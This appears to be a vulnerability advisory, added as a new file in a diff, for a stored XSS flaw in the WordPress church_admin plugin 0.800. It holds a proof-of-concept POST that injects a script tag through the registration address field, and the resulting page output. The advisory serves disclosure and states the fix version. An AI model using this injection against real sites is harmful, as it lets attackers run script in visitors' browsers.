@@ -1,0 +1,50 @@
+# Exploit Title: Wordpress church_admin Stored XSS
+# Date: 21-04-2015
+# Exploit Author: woodspeed
+# Vendor Homepage: https://wordpress.org/plugins/church-admin/
+# Version: 0.800
+# OSVDB ID : http://www.osvdb.org/show/osvdb/121304
+# WPVULNDB ID : https://wpvulndb.com/vulnerabilities/7999
+# Category: webapps
+
+1. Description
+
+On the registration form the address field is not validated before returning it to the user.
+Visiting the Directory page, will show the confirm window.
+
+2. Proof of Concept
+
+POST /wordpress/index.php/2015/05/21/church_admin-registration-form/
+
+
+
+save=yes&church_admin_register=9d18cf0420&_wp_http_referer=%2Fwordpress%2Findex.php%2F2015%2F05%2F21%2Fchurch_admin-registration-form%2F&first_name%5B%5D=test&prefix%5B%5D=&last_name%5B%5D=test&mobile%5B%5D=%2B3670&people_type_id%5B%5D=1&email%5B%5D=test%40test.test&sex1=male&phone=%2B3670&address=%3Cscript%3Econfirm%28%29%3C%2Fscript%3E&lat=51.50351129583287&lng=-0.148193359375&recaptcha_challenge_field=03AHJ_VuvBRBO1Vts65lchUe_H_c1AuISniJ4rFDcaPyecjg-HypsHSZSfTkCyZMUC6PjVQAkkuFDfpnsKn28LU8wIMxb9nF5g7XnIYLt0qGzhXcgX4LSX5ul7tPX3RSdussMajZ-_N1YQnOMJZj8b5e5LJgK68Gjf8aaILIyxKud2OF2bmzoZKa56gt1jBbzXBEGASVMMFJ59uB9FsoJIzVRyMJmaXbbrgM01jnSseeg-thefo83fUZS9uuqrBQgqAZGYMmTWdgZ4xvrzXUdv5Zc76ktq-LWKPA&recaptcha_response_field=134
+
+
+GET /wordpress/index.php/2015/05/21/church_admin-directory/
+
+
+
+
+	<header class="entry-header">
+		<h1 class="entry-title">church_admin directory</h1>	</header><!-- .entry-header -->
+	<div class="entry-content">
+		<p><a href="http://localhost/wordpress/?download=addresslist&addresslist=d759d84e16&member_type_id=1,2">PDF version</a></p><form name="ca_search" action="" method="POST">
+<p><label style="width:75px;float:left;">Search</label><input name="ca_search" type="text"/><input type="submit" value="Go"/><input type="hidden" name="ca_search_nonce" value="99de1bedec"/></p></form><div class="tablenav"><div class="tablenav-pages"><div class="pagination"></div>
+</div></div>
+<div class="church_admin_address" itemscope itemtype="http://schema.org/Person">
+	<div class="church_admin_name_address" >
+		<p><span itemprop="name"><strong>test test</strong></span></p>
+		<p><span itemprop="address" itemscope itemtype="http://schema.org/PostalAddress"><script>confirm()</script></span></p></div><!--church_admin_name_address-->
+	<div class="church_admin_phone_email">
+		<p> <a class="email" href="tel:+3670">+3670</a><br/>
+		<a class="email"  href="tel:+3670"><span itemprop="telephone">+3670</span></a><br/>
+<a class="email" itemprop="email" href="mailto:test@test.test">test@test.test</a><br/>
+
+		</p>
+
+	</div><!--church_admin_phone_email--> 
+
+3. Solution
+
+Fixed in version 0.810.
